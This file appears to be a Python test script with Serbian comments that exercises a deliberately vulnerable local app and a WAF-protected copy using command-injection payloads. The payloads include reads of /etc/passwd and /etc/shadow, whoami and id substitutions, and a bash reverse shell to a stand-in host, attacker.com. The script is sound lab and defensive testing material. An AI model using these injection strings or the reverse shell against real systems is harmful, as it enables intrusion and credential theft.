"""
Test skripta za demonstraciju Command Injection napada i WAF zastite.

Pokretanje:
    # Terminal 1 - ranjiva aplikacija (port 5000)
    python vulnerable_app/app.py

    # Terminal 2 - zasticena aplikacija (port 5001)
    python vulnerable_app/app_protected.py

    # Terminal 3 - pokretanje testova
    python tests/test_payloads.py
"""

import requests
import json

VULNERABLE_URL = "http://127.0.0.1:5000"
PROTECTED_URL  = "http://127.0.0.1:5001"

# ---------------------------------------------------------------
# Testni payloadi
# ---------------------------------------------------------------
ATTACK_PAYLOADS = [
    {
        "name": "Semicolon injection - citanje /etc/passwd",
        "param": "host",
        "value": "google.com; cat /etc/passwd",
        "expected_attack": True,
    },
    {
        "name": "Pipe injection - whoami",
        "param": "host",
        "value": "google.com | whoami",
        "expected_attack": True,
    },
    {
        "name": "AND operator - id komanda",
        "param": "host",
        "value": "google.com && id",
        "expected_attack": True,
    },
    {
        "name": "OR operator - uname",
        "param": "host",
        "value": "invalid_host || uname -a",
        "expected_attack": True,
    },
    {
        "name": "Backtick command substitution",
        "param": "host",
        "value": "google.com`whoami`",
        "expected_attack": True,
    },
    {
        "name": "Dollar-paren command substitution",
        "param": "host",
        "value": "$(cat /etc/shadow)",
        "expected_attack": True,
    },
    {
        "name": "Newline injection",
        "param": "host",
        "value": "google.com\nwhoami",
        "expected_attack": True,
    },
    {
        "name": "Output redirection",
        "param": "host",
        "value": "google.com > /tmp/pwned.txt",
        "expected_attack": True,
    },
    {
        "name": "Reverse shell pokusaj",
        "param": "host",
        "value": "127.0.0.1; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        "expected_attack": True,
    },
    {
        "name": "DNS lookup injection",
        "param": "domain",
        "value": "google.com; ls -la /",
        "expected_attack": True,
    },
]

LEGITIMATE_PAYLOADS = [
    {
        "name": "Legitimni hostname",
        "param": "host",
        "value": "google.com",
        "expected_attack": False,
    },
    {
        "name": "Legitimna IP adresa",
        "param": "host",
        "value": "8.8.8.8",
        "expected_attack": False,
    },
    {
        "name": "Legitimni domen",
        "param": "domain",
        "value": "example.com",
        "expected_attack": False,
    },
]


def run_tests(base_url, label):
    print(f"\n{'='*60}")
    print(f"  TESTIRANJE: {label}")
    print(f"  URL: {base_url}")
    print(f"{'='*60}")

    all_payloads = ATTACK_PAYLOADS + LEGITIMATE_PAYLOADS
    passed = 0
    failed = 0

    for test in all_payloads:
        param  = test["param"]
        value  = test["value"]
        is_attack = test["expected_attack"]

        try:
            r = requests.get(f"{base_url}/ping" if param == "host" else f"{base_url}/lookup",
                             params={param: value}, timeout=12)
            blocked = (r.status_code == 403)
        except requests.exceptions.ConnectionError:
            print(f"  [ERROR] Ne mogu da se povezem na {base_url}")
            return
        except Exception as e:
            print(f"  [ERROR] {e}")
            continue

        if is_attack:
            # Ocekujemo da napad bude blokiran (403)
            status = "PASS" if blocked else "FAIL"
            icon   = "✓" if blocked else "✗"
            detail = "Blokiran (403)" if blocked else f"PROPUSTEN! ({r.status_code})"
        else:
            # Ocekujemo da legitimni zahtev prodje
            status = "PASS" if not blocked else "FAIL"
            icon   = "✓" if not blocked else "✗"
            detail = "Propusten (legitiman)" if not blocked else "Pogresno blokiran (false positive)"

        print(f"  [{icon}] {status} | {test['name']}")
        print(f"        Payload: {repr(value)}")
        print(f"        Rezultat: {detail}")
        print()

        if status == "PASS":
            passed += 1
        else:
            failed += 1

    print(f"  Rezultat: {passed}/{passed+failed} testova proslo")
    print(f"{'='*60}")


def demo_attack(base_url, label):
    """Demonstracija stvarnog napada - prikazuje output."""
    print(f"\n{'='*60}")
    print(f"  DEMO NAPADA: {label}")
    print(f"{'='*60}")

    payload = "127.0.0.1; whoami"
    print(f"  Payload: {repr(payload)}")
    print(f"  Endpoint: GET /ping?host={payload}")
    print()

    try:
        r = requests.get(f"{base_url}/ping", params={"host": payload}, timeout=12)
        data = r.json()
        if r.status_code == 403:
            print(f"  [BLOCKED] WAF je blokirao zahtev!")
            print(f"  Razlog: {data.get('reason', 'N/A')}")
        else:
            print(f"  [EXECUTED] Komanda izvrsena! Output:")
            print(f"  {data.get('output', data)[:300]}")
    except Exception as e:
        print(f"  [ERROR] {e}")


if __name__ == "__main__":
    print("\n" + "="*60)
    print("  WAF Command Injection - Test Suite")
    print("="*60)
    print("\nNapomena: Pokrenite oba servera pre testiranja.")
    print("  python vulnerable_app/app.py          (port 5000)")
    print("  python vulnerable_app/app_protected.py (port 5001)")

    demo_attack(VULNERABLE_URL, "RANJIVA aplikacija (bez WAF-a)")
    demo_attack(PROTECTED_URL,  "ZASTICENA aplikacija (sa WAF-om)")

    run_tests(VULNERABLE_URL, "RANJIVA aplikacija (ocekujemo da napadi PRODJU)")
    run_tests(PROTECTED_URL,  "ZASTICENA aplikacija (ocekujemo da napadi BUDU BLOKIRANI)")
